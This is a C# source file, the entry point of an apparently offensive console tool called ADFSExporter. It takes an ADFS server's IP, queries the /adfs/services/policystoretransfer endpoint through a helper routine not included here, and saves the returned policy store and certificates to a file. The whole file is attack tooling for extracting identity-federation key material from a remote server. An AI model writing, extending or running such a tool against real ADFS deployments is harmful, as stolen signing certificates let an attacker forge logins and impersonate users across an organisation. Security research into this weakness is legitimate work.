using System;
using System.IO;

namespace ADFSExporter
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("ADFSExporter... the tool you use when you want to export certs from ADFS\n");
            
            
            if (args.Length < 2)
            {
                Console.WriteLine("Usage: ADFSExporter.exe [IP of ADFS server] [Output File]");
                return;
            }

            var serverPath = "http://" + args[0] + "/adfs/services/policystoretransfer";
            Console.WriteLine("[*] Running export against {0}, please wait...", serverPath);
            var result = Exporter.Export(serverPath);

            using (FileStream fs = new FileStream(args[1], FileMode.OpenOrCreate))
            {
                var byteConverted = System.Text.ASCIIEncoding.ASCII.GetBytes(result);
                fs.Write(byteConverted, 0, byteConverted.Length);
            }

            Console.WriteLine("[*] Done, contents should be in {0}", args[1]);
        }
    }
}
